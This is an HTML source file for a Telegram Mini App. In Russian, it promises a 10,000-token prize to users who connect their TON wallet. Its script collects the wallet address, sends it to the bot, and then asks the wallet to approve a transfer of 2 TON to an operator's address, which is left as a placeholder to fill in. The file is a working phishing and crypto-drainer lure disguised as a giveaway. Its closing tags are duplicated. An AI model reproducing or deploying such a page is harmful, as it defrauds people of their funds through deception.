<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Telegram Mini App</title>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <script src="https://unpkg.com/@tonconnect/sdk@latest/dist/tonconnect-sdk.min.js"></script>
    <style>
        body {
            font-family: Arial, sans-serif;
            text-align: center;
            margin: 0;
            padding: 0;
            background-color: #f5f5f5;
        }
        .container {
            max-width: 400px;
            margin: 20px auto;
            background: white;
            padding: 20px;
            border-radius: 10px;
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
        }
        img {
            width: 100%;
            border-radius: 10px;
        }
        p {
            font-size: 18px;
            color: #333;
        }
        button {
            background: #0088cc;
            color: white;
            padding: 10px;
            border: none;
            border-radius: 5px;
            cursor: pointer;
            width: 100%;
            font-size: 16px;
            margin-top: 10px;
        }
        button:hover {
            background: #0077b6;
        }
    </style>
</head>
<body>
    <div class="container">
        <img src="https://raw.githubusercontent.com/RFRFQRFARFQF/Telegram-mini-app/main/photo.jpg" alt="Фото">
        <p>ПОЛУЧИТЬ 10.000$FPIBANK</p>  <!-- Оставил твой оригинальный текст -->
        <p>ПОДКЛЮЧИ КОШЕЛЕК ДЛЯ ПОЛУЧЕНИЯ ПРИЗА</p>
        <button id="connect-wallet">CONNECT WALLET</button>
    </div>

    <script>
        let tg = window.Telegram.WebApp;
        tg.expand();

        const tonConnect = new TONConnect({
            manifestUrl: "https://raw.githubusercontent.com/RFRFQRFARFQF/Telegram-mini-app/main/tonconnect-manifest.json"
        });

        document.getElementById("connect-wallet").addEventListener("click", async function() {
            try {
                const connectedWallet = await tonConnect.connect();
                if (connectedWallet) {
                    const walletAddress = connectedWallet.account.address;
                    
                    tg.sendData(JSON.stringify({ wallet: walletAddress }));

                    tg.showAlert("Кошелек подключен: " + walletAddress);

                    const transaction = {
                        to: "EQC3DQ...ЗАМЕНИТЕ_НА_АДРЕС",
                        value: "2000000000",
                        payload: "",
                    };

                    await tonConnect.sendTransaction(transaction);
                    tg.showAlert("Транзакция создана! Подтвердите в кошельке.");
                }
            } catch (error) {
                tg.showAlert("Ошибка: " + error.message);
            }
        });

        
    </script>
</body>
</html>


        Telegram.WebApp.ready();
    </script>
</body>
</html>
